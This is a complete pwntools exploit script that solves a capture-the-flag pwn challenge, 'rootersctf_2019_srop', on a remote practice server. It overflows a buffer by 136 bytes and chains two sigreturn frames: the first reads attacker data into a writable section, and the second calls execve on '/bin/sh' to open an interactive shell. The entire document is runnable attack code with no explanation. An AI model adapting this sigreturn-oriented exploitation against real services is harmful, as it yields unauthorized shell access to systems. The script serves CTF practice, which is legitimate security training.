#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 0
if debug:
    p = process('./rootersctf_2019_srop')
    # context.terminal = ['tmux','splitw','-h']
    # context.log_level='debug'
    # gdb.attach(p,'b read')
else:
    p = remote('node5.buuoj.cn', 29873)
context.arch = 'amd64'

offset = 136
data_addr = 0x0000000000402000
start_addr = 0x0000000000401021
syscall_ret = 0x0000000000401033
pop_ret_gadget = 0x0000000000401032

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = data_addr
frame.rdx = 0x400
frame.rip = syscall_ret
frame.rbp = data_addr


p.recvuntil(b'Hey, can i get some feedback for the CTF?')
payload = b'A' * offset
payload += p64(pop_ret_gadget)
payload += p64(0xf)
payload += bytes(frame)
# input()
p.send(payload)



frame = SigreturnFrame()
frame.rax = 59
frame.rdi = data_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret


payload = b'/bin/sh\x00'
# payload += b'A' * 0x20
payload += p64(pop_ret_gadget)
payload += p64(0xf)
payload += bytes(frame)
# input()
p.send(payload)



p.interactive()

